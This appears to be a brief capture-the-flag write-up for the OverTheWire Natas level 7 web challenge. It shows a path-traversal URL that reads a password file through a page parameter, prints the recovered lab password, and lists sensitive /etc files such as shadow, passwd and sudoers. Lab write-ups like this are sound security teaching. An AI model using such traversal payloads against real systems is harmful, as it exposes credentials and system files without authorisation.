# Natas 7
This challenge show up with two link, one for open an Home page and another for the page about.
When clicking on a link you will be redirected to a url with a url parameter:
```url
http://natas7.natas.labs.overthewire.org/index.php?page=about
```
the first thing that i tried is to read the */etc/natas_webpass/natas8* using path traversal (see natas home page to know why this file).

```url
http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../etc/natas_webpass/natas8
```
and the page returned me the password for the next challenge:
xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q

# Close up
etc in general is an import directory, not only in natas challenge. 
*The "/etc" directory in the Linux file system serves a important role in the overall functionality and security of the operating system. It is a central location where important system configuration files and directories are stored. The name "/etc" stands for "et cetera," indicating that it contains miscellaneous system files that do not fit into other specific directories.*

some important file in etc
- /etc/shadow
- /etc/passwd
- /etc/hosts
- /etc/sudoers
- /etc/cron*